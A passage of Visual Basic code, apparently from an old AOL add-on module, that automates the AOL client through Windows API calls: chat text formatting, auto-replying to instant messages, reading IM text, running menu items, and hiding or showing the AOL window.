        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    Yellow_LBlue_Yellow = Msg
End Function
Sub BoldWavY(thetext)

G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    R$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    P$ = P$ & "<sup>" & R$ & "<B></sup>" & U$ & "<sub>" & S$ & "</sub>" & T$
Next W
BoldSendChat (P$)

End Sub

Sub CenterForm(F As Form)
F.Top = (Screen.Height * 0.85) / 2 - F.Height / 2
F.Left = Screen.Width / 2 - F.Width / 2
End Sub
Sub RespondIM(message)
'This finds an IM sent to you, answers it with a
'message of "message", sends it and then closes the
'IM window
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")

Im% = FindChildByTitle(mdi%, ">Instant Message From:")
If Im% Then GoTo Greed
Im% = FindChildByTitle(mdi%, "  Instant Message From:")
If Im% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(Im%, "RICHCNTL")

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT) 'Send Text
e = GetWindow(e2, GW_HWNDNEXT) 'Send Button
Call SendMessageByString(e2, WM_SETTEXT, 0, message)
ClickIcon (e)
Call timeout(0.8)
Im% = FindChildByTitle(mdi%, "  Instant Message From:")
e = FindChildByClass(Im%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT) 'cancel button...
'to close the IM window
ClickIcon (e)
End Sub

Function MessageFromIM()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")

Im% = FindChildByTitle(mdi%, ">Instant Message From:")
If Im% Then GoTo Greed
Im% = FindChildByTitle(mdi%, "  Instant Message From:")
If Im% Then GoTo Greed
Exit Function
Greed:
imtext% = FindChildByClass(Im%, "RICHCNTL")
IMmessage = GetText(imtext%)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(blah, Len(blah) - 1)
End Function

Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub

Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For GetString = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
Menuitem% = SubCount%
GoTo MatchString
End If

Next GetString

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, Menuitem%, 0)
End Sub



Sub Upchat()
aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(aol%, 1)
Call EnableWindow(Upp%, 0)
End Sub
Sub UnUpchat()
aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(aol%, 0)
End Sub

Sub HideAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(aol%, 0)
End Sub

Sub ShowAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(aol%, 5)
End Sub
